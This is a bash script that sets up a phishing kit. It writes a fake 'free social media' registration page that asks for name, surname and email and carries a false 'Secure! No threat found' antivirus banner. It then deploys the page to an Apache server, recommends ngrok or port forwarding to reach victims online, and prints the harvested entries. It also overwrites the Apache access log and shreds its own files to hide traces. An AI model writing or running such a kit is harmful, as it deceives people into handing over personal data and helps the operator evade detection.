#!/bin/bash

bar ()
{
BAR='=  =  =  =  \e[01;32m=  =  =  =  =  \e[00;34m !'    
                         
for i in {0..59}; do
    echo -ne "\r${BAR:0:$i}" 
    sleep 0.04
done
}

pwd > pos.txt
pos=$(cat pos.txt)
rm pos.txt

echo " "
echo -e "\e[00;36mFor use over internet use ngrok or port forwarding your firewall\e[00m"
echo " "
sleep 0.7
cat > index.html << EOF
<!DOCTYPE html>
<html lang="en">
<head>

<form action="processo.php" method="POST">

 <style>
body {
  background-image: url('sf5.png');
}
</style> 

<br>




<p style="color:red;">The Social media with no problems!
Try it, is free!</p>


<p>=========================</p>



<p class="big">
 <br>
 <br>
 
 <br>
 <br>
 </p>
<h1 align=left style="color:grey;">SIGN IN</h1>

    <input name="field1" type="text" placeholder="Name"/>
    
    <p>---</p>
    <input name="field2" type="text" placeholder="Surname"/>
    
    <p>---</p>
    <input name="field3" type="text" placeholder="Email"/>
<p>    
        
    <input type="submit" name="submit" value="Register">



<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
.alert {
    padding: 20px;
    background-color: #4CAF50;
    color: white;
}

.closebtn {
    margin-left: 15px;
    color: white;
    font-weight: bold;
    float: right;
    font-size: 22px;
    line-height: 20px;
    cursor: pointer;
    transition: 0.3s;
}

.closebtn:hover {
    color: black;
}
</style>
<head>
<body>


<p class="big">
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
 <br>
 <br>
 
 <br>
 <br>
 
 <br>
 <br>
  <br>
 <br>
 
 <br>
 <br>
</p>
<div class="alert">
  <span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> 
  <strong>Secure!</strong> No threat found by htmlcode-antivirus * auto websag service label for your security
</div>

</body>
</html>

<p>---</p>

</form>
EOF

pwd > dir.txt
backd=$(cat dir.txt)

cp * /var/www/html
cd /var/www/html
shred -n 7 -u -z mstart.sh > /dev/null
shred -u -z dir.txt > /dev/null
cd $backd

shred -u dir.txt > /dev/null

chown -R root /var/www/html
chmod 755 /var/www/html

service apache2 restart
sleep 2

echo " "
echo -e "\e[00;33mAll data in apache log will be erased, press ENTER\e[00m: "
read
echo "DEVICE CONNECTED: " > /var/log/apache2/access.log
sleep 1
echo " "
xterm -e tail -f /var/log/apache2/access.log &
echo -e "\e[01;32mWhen you see contacts press ENTER\e[00m: "
read 
sleep 2

cd
cd /tmp
ls > prl.txt
cat prl.txt | grep apache2 > ap.txt
dire=$(cat ap.txt)
cd $dire
cd tmp


echo -e "\e[01;32mTracking data...\e[00m"
sleep 0.5
echo -e "\e[00;31m"
bar
echo " "
sleep 0.2
echo " "
echo -e "\e[01;36m"
cat mydata.txt
echo -e "\e[00m"
echo " "
service apache2 stop
cd
cd $pos
rm index.html
echo -e "\e[01;32mFinish\e[00m"
